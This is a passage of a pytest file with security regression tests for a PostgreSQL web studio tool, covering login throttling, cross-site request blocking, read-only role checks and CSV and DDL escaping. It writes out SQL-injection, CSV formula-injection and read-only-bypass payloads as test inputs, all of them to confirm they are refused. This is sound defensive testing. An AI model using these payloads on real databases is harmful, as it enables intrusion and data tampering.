        assert attacker.get("/api/meta", headers=wrong).status_code == 429


def test_failure_table_is_bounded(monkeypatch: pytest.MonkeyPatch) -> None:
    # B7: one entry per client address, so a spray from many addresses must not grow it
    # without limit; the oldest entries are dropped first.
    monkeypatch.setattr(server, "LOGIN_MAX_CLIENTS", 4)

    async def app(scope: Scope, receive: Receive, send: Send) -> None: ...

    guard = server._Guard(app, "t" * 32, None)
    for i in range(10):
        guard._record_failure(f"10.0.0.{i}", b"Bearer x")
    assert list(guard._failures) == [f"10.0.0.{i}" for i in range(6, 10)]


async def test_a_column_named_like_the_row_alias(pg_url: str, driver: PostgresDriver) -> None:
    # B33: `to_jsonb(t)` read a column named "t" instead of the row alias, so listing,
    # export, insert and update broke on such a table.
    async with driver.acquire() as conn:
        await conn.execute("DROP TABLE IF EXISTS public.alias_clash", [])
        await conn.execute(
            "CREATE TABLE public.alias_clash (id int GENERATED ALWAYS AS IDENTITY PRIMARY KEY, "
            "t text)",
            [],
        )
    base = "/api/tables/public/alias_clash"
    with make_client(pg_url) as client:
        created = client.post(f"{base}/rows", json={"values": {"t": "x"}}, headers=AUTH)
        assert created.status_code in (200, 201), created.text
        listed = client.get(f"{base}/rows", headers=AUTH)
        assert listed.status_code == 200, listed.text
        exported = client.get(f"{base}/export", params={"format": "json"}, headers=AUTH)
        assert exported.status_code == 200
        assert [row["t"] for row in exported.json()] == ["x"]


def test_a_web_page_cannot_lock_out_a_local_studio(
    pg_url: str, driver: PostgresDriver, monkeypatch: pytest.MonkeyPatch
) -> None:
    # B35: on a loopback bind every client is 127.0.0.1, so a web page the user visits could
    # send wrong-credential requests through the browser and trip the throttle for the real
    # user. Cross-site browser requests are refused before the credential check and are not
    # counted as failures.
    monkeypatch.setattr(server, "LOGIN_MAX_FAILURES", 3)
    page_requests = [
        {"Sec-Fetch-Site": "cross-site"},
        {"Sec-Fetch-Site": "same-site"},
        {"Origin": "http://evil.example"},
    ]
    with make_client(pg_url, address="127.0.0.1") as client:
        for headers in page_requests * 3:
            for method in ("GET", "POST"):
                response = client.request(method, "/api/meta", headers=headers)
                assert response.status_code == 403, (method, headers)
        assert client.get("/api/meta", headers=AUTH).status_code == 200


def test_only_new_guesses_count_toward_the_throttle(
    pg_url: str, driver: PostgresDriver, monkeypatch: pytest.MonkeyPatch
) -> None:
    # B68: a tab still holding an old token re-sends it on every reload, two requests each.
    # On loopback the real user shares the address, so five reloads locked them out.
    monkeypatch.setattr(server, "LOGIN_MAX_FAILURES", 3)
    stale = {"Authorization": "Bearer old-token-from-the-last-run"}
    with make_client(pg_url, address="127.0.0.1") as client:
        for _ in range(10):
            assert client.get("/api/meta", headers=stale).status_code == 401
            assert client.get("/api/meta").status_code == 401  # no credential at all
        assert client.get("/api/meta", headers=AUTH).status_code == 200


def test_same_origin_requests_pass_without_an_origin_setting(
    pg_url: str, driver: PostgresDriver
) -> None:
    # B72: a remote bind without MIZZLE_STUDIO_ORIGIN accepts the origin of the Host the
    # request was sent to, and still refuses any other.
    with make_client(pg_url) as client:
        same = {**AUTH, "Origin": "http://testserver"}
        assert client.post("/api/sql", json={"sql": "select 1"}, headers=same).status_code == 200
        other = {**AUTH, "Origin": "http://studio.evil"}
        assert client.post("/api/sql", json={"sql": "select 1"}, headers=other).status_code == 403


def test_read_only_checks_the_login_role_too(pg_url: str, ro_url: str) -> None:
    # B69: a superuser whose ALTER ROLE ... SET role starts it as a plain role passed the
    # check, then set_config('role', 'none', false) made it a superuser again.
    sup = "mizzle_studio_sup"
    with make_client(pg_url) as admin:
        admin.post(
            "/api/sql",
            json={
                "sql": f"drop role if exists {sup}; "
                f"create role {sup} superuser login password 'sup'; "
                f"alter role {sup} set role = {RO_ROLE}"
            },
            headers=AUTH,
        )
        try:
            parts = urlsplit(pg_url)
            url = urlunsplit(parts._replace(netloc=f"{sup}:sup@{parts.hostname}:{parts.port}"))
            with (
                pytest.raises(MigrationError, match="superuser"),
                make_client(url, read_only=True),
            ):
                pass
        finally:
            admin.post("/api/sql", json={"sql": f"drop role {sup}"}, headers=AUTH)


def test_rows_keep_numbers_a_browser_cannot_hold(client: TestClient) -> None:
    # B71: rows were decoded through float, so numeric(40,20) came back rounded.
    big = "12345678901234567890.12345678901234567890"
    client.post(
        "/api/sql",
        json={
            "sql": "drop table if exists st_num; "
            "create table st_num (id int primary key, n numeric(40,20), b bigint, f float8); "
            f"insert into st_num values (1, {big}, 9007199254740993, 1.5)"
        },
        headers=AUTH,
    )
    [row] = client.get("/api/tables/public/st_num/rows", headers=AUTH).json()["rows"]
    assert row == {"id": 1, "n": big, "b": "9007199254740993", "f": 1.5}
    exported = client.get(
        "/api/tables/public/st_num/export", params={"format": "json"}, headers=AUTH
    ).text
    assert big in exported
    assert "9007199254740993" in exported
    csv_text = client.get(
        "/api/tables/public/st_num/export", params={"format": "csv"}, headers=AUTH
    ).text
    assert big in csv_text


def test_csv_type_check_is_not_fooled_by_a_schema_name(client: TestClient) -> None:
    # B73: a domain "date".note over text started with "date", so its formula exported raw.
    client.post(
        "/api/sql",
        json={
            "sql": 'drop table if exists st_dom; drop schema if exists "date" cascade; '
            'create schema "date"; create domain "date".note as text; '
            'create table st_dom (id int primary key, v "date".note); '
            "insert into st_dom values (1, '=cmd')"
        },
        headers=AUTH,
    )
    text = client.get(
        "/api/tables/public/st_dom/export", params={"format": "csv"}, headers=AUTH
    ).text
    assert list(csv.reader(io.StringIO(text)))[1] == ["1", "'=cmd"]
    client.post(
        "/api/sql", json={"sql": 'drop table st_dom; drop schema "date" cascade'}, headers=AUTH
    )


def test_ddl_default_refuses_a_backslash() -> None:
    # B74: with standard_conforming_strings = off the server reads \' as an escaped quote.
    import mizzle.studio.ddl as ddl

    assert not ddl._DEFAULT.fullmatch("'\\' + ' ; create table pwned(); --'")
    assert ddl._DEFAULT.fullmatch("'it''s'")


def test_read_only_refuses_functions_that_run_a_query_string(ro_url: str) -> None:
    # C2: ts_stat() runs its argument as SQL, so a blocked call hid inside the string.
    with make_client(ro_url, read_only=True) as client:
        for sql in (
            "select * from ts_stat('select to_tsvector(pg_terminate_' || 'backend(1)::text)')",
            "select ts_rewrite('a'::tsquery, 'select 1')",
            "select cursor_to_xml('c', 1, true, false, '')",
        ):
            response = client.post("/api/sql", json={"sql": sql}, headers=AUTH)
            assert response.status_code == 403, (sql, response.text)


async def test_read_only_refuses_a_direct_grant_on_a_server_function(
    pg_url: str, ro_url: str
) -> None:
    # C2: GRANT EXECUTE ON pg_read_file gives a plain role the server role's ability.
    with make_client(pg_url) as admin:
        grant = f"grant execute on function pg_read_file(text) to {RO_ROLE}"
        admin.post("/api/sql", json={"sql": grant}, headers=AUTH)
        try:
            assert "EXECUTE on pg_read_file()" in await server.privileged_roles(
                PostgresDialect(), ro_url
            )
        finally:
            revoke = f"revoke execute on function pg_read_file(text) from {RO_ROLE}"
            admin.post("/api/sql", json={"sql": revoke}, headers=AUTH)
    assert await server.privileged_roles(PostgresDialect(), ro_url) == []


def test_an_empty_bearer_is_not_a_failed_login(
    pg_url: str, driver: PostgresDriver, monkeypatch: pytest.MonkeyPatch
) -> None:
    # C3: the UI behind --auth sent "Bearer " with no token; it must not count as a guess.
    monkeypatch.setattr(server, "LOGIN_MAX_FAILURES", 2)
    with make_client(pg_url, address="10.0.0.9") as client:
        for _ in range(5):
            assert client.get("/api/meta", headers={"Authorization": "Bearer "}).status_code == 401
        assert client.get("/api/meta", headers=AUTH).status_code == 200


def test_values_are_checked_by_the_column_not_cut_by_a_cast(client: TestClient) -> None:
    # C4: CAST($1 AS varchar(5)) cut "qwertyuiop" to "qwert", and a key filter matched and
    # deleted the wrong row.
    client.post(
        "/api/sql",
        json={
            "sql": "drop table if exists st_mod; "
            "create table st_mod (code varchar(3) primary key, amount numeric(5,2), "
            "flag char(2), bits bit(3)); insert into st_mod values ('abc', 1, 'ab', '101')"
        },
        headers=AUTH,
    )
    rows = "/api/tables/public/st_mod/rows"
    too_long = client.post(rows, json={"values": {"code": "qwertyuiop"}}, headers=AUTH)
    assert too_long.status_code == 400 and "StringDataRightTruncation" in too_long.text
    filtered = client.get(
        rows,
        params={"filters": json.dumps([{"column": "code", "op": "eq", "value": "abcZZZ"}])},
        headers=AUTH,
    ).json()
    assert filtered["rows"] == []
    deleted = client.request("DELETE", rows, json={"keys": [{"code": "abcZZZ"}]}, headers=AUTH)
    assert deleted.json() == {"deleted": 0}
    # Unmodified char and bit mean length 1: they must not cut either.
    ok = client.post(
        rows, json={"values": {"code": "xyz", "flag": "cd", "bits": "011"}}, headers=AUTH
    )
    assert ok.status_code == 201, ok.text
    assert ok.json()["row"]["flag"] == "cd" and ok.json()["row"]["bits"] == "011"


def test_console_reads_at_most_the_rows_it_shows(client: TestClient) -> None:
    # C5: every row was loaded before keeping 1000. C9: duplicate column names merged, and
    # a bigint above 2**53 was a JSON number a browser rounds.
    big = client.post(
        "/api/sql", json={"sql": "select g from generate_series(1, 5000) g"}, headers=AUTH
    ).json()
    assert big["truncated"] is True and big["count"] == 1000 and len(big["rows"]) == 1000
    dup = client.post(
        "/api/sql",
        json={"sql": "select 1 as a, 2 as a, 9007199254740993::bigint as b"},
        headers=AUTH,
    ).json()
    assert dup["columns"] == ["a", "a", "b"]
    assert dup["rows"] == [[1, 2, "9007199254740993"]]
    # Statements that are not queries still run, outside any cursor.
    done = client.post(
        "/api/sql",
        json={"sql": "create temp table st_t (x int); insert into st_t values (1) returning x"},
        headers=AUTH,
    ).json()
    assert done["results"][1]["rows"] == [[1]]


def test_studio_state_file_is_private(pg_url: str, driver: PostgresDriver, tmp_path: Path) -> None:
    # C6: the history (passwords included) was written world-readable, and not ignored.
    state = tmp_path / ".mizzle" / "studio.json"
    with make_client(pg_url, state_path=state) as client:
        client.post("/api/sql", json={"sql": "select 1"}, headers=AUTH)
    assert state.stat().st_mode & 0o777 == 0o600
    assert "*" in (tmp_path / ".mizzle" / ".gitignore").read_text()


def test_a_failed_export_is_an_error_not_a_short_file(client: TestClient) -> None:
    # C7: a bad filter gave 200 with only the CSV header (or "[" for JSON).
    bad = json.dumps([{"column": "id", "op": "eq", "value": "abc"}])
    for fmt in ("csv", "json"):
        response = client.get(
            "/api/tables/public/users/export",
            params={"format": fmt, "filters": bad},
            headers=AUTH,
        )
        assert response.status_code == 400, (fmt, response.text)
    # A JSON export with several batches is still one valid array.
    client.post(
        "/api/sql",
        json={
            "sql": "drop table if exists st_many; create table st_many (id int primary key); "
            "insert into st_many select generate_series(1, 2500)"
        },
        headers=AUTH,
    )
    text = client.get(
        "/api/tables/public/st_many/export", params={"format": "json"}, headers=AUTH
    ).text
    assert len(json.loads(text)) == 2500


def test_drop_table_drops_the_table_it_checked(client: TestClient) -> None:
    # C8: "table" was checked and "name" dropped, so hidden tables could be dropped.
    preview = client.post(
        "/api/ddl/preview",
        json={"operation": "drop_table", "schema": "public", "table": "users", "name": "nosuch"},
        headers=AUTH,
    )
    assert preview.status_code == 400 and "does not exist" in preview.text


def test_json_and_numeric_cells_keep_their_exact_text(client: TestClient) -> None:
    # S1: big or precise numbers inside jsonb came back as strings, and an edit wrote the
    # strings back. S2: jsonb "42" saved unchanged became the number 42. S3: CSV and the
    # grid showed numeric 1.50 as 1.5.
    client.post(
        "/api/sql",
        json={
            "sql": "drop table if exists st_json; create table st_json (id int primary key, "
            "j jsonb, s jsonb, n numeric(6,2), ns numeric[]); insert into st_json values "
            """(1, '{"big": 12345678901234567890, "p": 0.1000000000000000055511151231257827,"""
            """ "x": 1}', '"42"', 1.50, '{1.50,2}')"""
        },
        headers=AUTH,
    )
    rows = "/api/tables/public/st_json/rows"
    [row] = client.get(rows, headers=AUTH).json()["rows"]
    assert (
        row["j"]
        == '{"p": 0.1000000000000000055511151231257827, "x": 1, "big": 12345678901234567890}'
    )
    assert row["s"] == '"42"' and row["n"] == "1.50" and row["ns"] == "{1.50,2}"
    edited = row["j"].replace('"x": 1', '"x": 2')
    saved = client.patch(
        rows, json={"key": {"id": 1}, "values": {"j": edited, "s": row["s"]}}, headers=AUTH
    )
    assert saved.status_code == 200, saved.text
    check = client.post(
        "/api/sql",
        json={
            "sql": "select jsonb_typeof(j->'big'), jsonb_typeof(j->'p'), jsonb_typeof(s) "
            "from st_json"
        },
        headers=AUTH,
    ).json()
    assert check["rows"] == [["number", "number", "string"]]
    text = client.get("/api/tables/public/st_json/export", headers=AUTH).text
    [header, line] = list(csv.reader(io.StringIO(text)))
    assert dict(zip(header, line, strict=True))["n"] == "1.50"
    assert dict(zip(header, line, strict=True))["s"] == '"42"'
    exported = client.get(
        "/api/tables/public/st_json/export", params={"format": "json"}, headers=AUTH
    ).text
    assert '"big": 12345678901234567890' in exported


def test_negative_scale_numeric_keys_are_not_rounded(client: TestClient) -> None:
    # S4: numeric(5,-2) kept its modifier in the cast, so 1250 rounded to 1300 and the
    # DELETE removed that row.
    made = client.post(
        "/api/sql",
        json={
            "sql": "drop table if exists st_neg; create table st_neg (k numeric(5,-2) "
            "primary key); insert into st_neg values (1200), (1300)"
        },
        headers=AUTH,
    )
    if "error" in made.json():  # a negative scale needs PostgreSQL 15
        pytest.skip(made.json()["error"])
    rows = "/api/tables/public/st_neg/rows"
    deleted = client.request("DELETE", rows, json={"keys": [{"k": "1250"}]}, headers=AUTH)
    assert deleted.json() == {"deleted": 0}
    assert client.get(rows, headers=AUTH).json()["total"] == 2


def test_a_slash_in_a_table_name_is_routed(client: TestClient) -> None:
    # S5: %2F was decoded before routing, so "a/b" fell through to a 404.
    client.post(
        "/api/sql",
        json={"sql": 'drop table if exists "st/a"; create table "st/a" (id int primary key)'},
        headers=AUTH,
    )
    client.get("/api/tables", headers=AUTH)  # load the snapshot
    response = client.get("/api/tables/public/st%2Fa/rows", headers=AUTH)
    assert response.status_code == 200, response.text
    assert response.json()["total"] == 0


def test_console_reads_every_statement_through_a_cursor(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    # S6: only statements starting with SELECT/WITH/VALUES/TABLE used the cursor, so
    # "(select ...)", FETCH ALL and INSERT ... RETURNING loaded every row.
    from mizzle.dialects.postgres.driver import PostgresConnection

    fetched: list[str] = []
    original = PostgresConnection.fetch

    async def spy(self: PostgresConnection, sql: str, *args: Any, **kwargs: Any) -> Any:
        fetched.append(sql)
        return await original(self, sql, *args, **kwargs)

    monkeypatch.setattr(PostgresConnection, "fetch", spy)
    for sql in (
        "(select g from generate_series(1, 5000) g)",
        "create temp table st_c (g int); insert into st_c select generate_series(1, 5000) "
        "returning g",
    ):
        result = client.post("/api/sql", json={"sql": sql}, headers=AUTH).json()
        last = result["results"][-1] if "results" in result else result
        assert last["truncated"] is True and last["count"] == 1000
    assert not [s for s in fetched if "5000" in s]
    # Statements that cannot run in a transaction block still run.
    vacuum = client.post("/api/sql", json={"sql": "vacuum"}, headers=AUTH)
    assert vacuum.status_code == 200, vacuum.text


def test_read_only_keeps_saved_queries_and_history_untouched(
    pg_url: str, ro_url: str, driver: PostgresDriver, tmp_path: Path
) -> None:
    """S15: read-only Studio may not write saved queries or history, nor read the
    read-write history; an empty saved-query name is refused."""
    state = tmp_path / "studio.json"
    with make_client(pg_url, state_path=state) as client:
        blank = client.put("/api/queries/saved/%20", json={"sql": "select 1"}, headers=AUTH)
        assert blank.status_code == 400
        client.put("/api/queries/saved/top", json={"sql": "select 42"}, headers=AUTH)
        client.post("/api/sql", json={"sql": "select 'rw secret'"}, headers=AUTH)
    before = state.read_text()
    with make_client(ro_url, read_only=True, state_path=state) as client:
        assert client.get("/api/queries/history", headers=AUTH).json()["history"] == []
        put = client.put("/api/queries/saved/x", json={"sql": "select 1"}, headers=AUTH)
        assert put.status_code == 403
        assert client.delete("/api/queries/saved/top", headers=AUTH).status_code == 403
        client.post("/api/sql", json={"sql": "select 1"}, headers=AUTH)
        assert client.get("/api/queries/saved", headers=AUTH).json()["saved"] == [
            {"name": "top", "sql": "select 42"}
        ]
    assert state.read_text() == before


def _sql(client: TestClient, sql: str) -> None:
    response = client.post("/api/sql", json={"sql": sql}, headers=AUTH)
    assert response.status_code == 200, response.text


def test_csv_keeps_signed_values_of_domain_columns(client: TestClient) -> None:
    # S7: a domain over numeric/interval read as text, so -5 exported as '-5.
    _sql(
        client,
        "drop table if exists st_sdom; drop domain if exists st_amt2, st_amt, st_span; "
        "create domain st_amt as numeric; create domain st_amt2 as st_amt; "
        "create domain st_span as interval; "
        "create table st_sdom (id int primary key, a st_amt, b st_amt2, c st_span); "
        "insert into st_sdom values (1, -5, -1.5, '-1 day')",
    )
    text = client.get("/api/tables/public/st_sdom/export", headers=AUTH).text
    assert list(csv.reader(io.StringIO(text)))[1] == ["1", "-5", "-1.5", "-1 days"]


def test_data_errors_show_the_server_message(client: TestClient) -> None:
    # S9: a class-22 error (invalid input syntax) came back as "invalid value (value hidden)".
    _sql(client, "drop table if exists st_bad; create table st_bad (id int primary key)")
    response = client.post(
        "/api/tables/public/st_bad/rows", json={"values": {"id": "abc"}}, headers=AUTH
    )
    assert response.status_code == 400
    assert response.json()["error"] == 'invalid input syntax for type integer: "abc"'


def test_csv_header_is_formula_safe(client: TestClient) -> None:
    # S10: a column named "=cmd()" went out raw in the header row.
    _sql(client, 'drop table if exists st_head; create table st_head (id int, "=cmd()" int)')
    text = client.get("/api/tables/public/st_head/export", headers=AUTH).text
    assert next(csv.reader(io.StringIO(text))) == ["id", "'=cmd()"]


def test_paging_by_a_non_unique_column_sees_every_row(client: TestClient) -> None:
    # S13: ORDER BY a column full of ties had no tie-breaker, so pages repeated rows.
    _sql(
        client,
        "drop table if exists st_tie; create table st_tie (id int primary key, g int); "
        "insert into st_tie select i, 0 from generate_series(1, 30) i",
    )
    seen: list[int] = []
    for offset in range(0, 30, 3):
        page = client.get(
            "/api/tables/public/st_tie/rows",
            params={"order": "g", "limit": "3", "offset": str(offset)},
            headers=AUTH,
        ).json()
        seen += [row["id"] for row in page["rows"]]
    assert seen == list(range(1, 31))


def test_insert_skipped_by_a_trigger_is_reported(client: TestClient) -> None:
    # S14: a BEFORE trigger returning NULL left RETURNING empty, and the insert was a 500.
    _sql(
        client,
        "drop table if exists st_skip; create table st_skip (id int primary key); "
        "create or replace function st_skip_fn() returns trigger language plpgsql "
        "as 'begin return null; end'; "
        "create trigger st_skip_tr before insert on st_skip "
        "for each row execute function st_skip_fn()",
    )
    response = client.post(
        "/api/tables/public/st_skip/rows", json={"values": {"id": 1}}, headers=AUTH
    )
    assert response.status_code == 409
    assert "no row was inserted" in response.json()["error"]
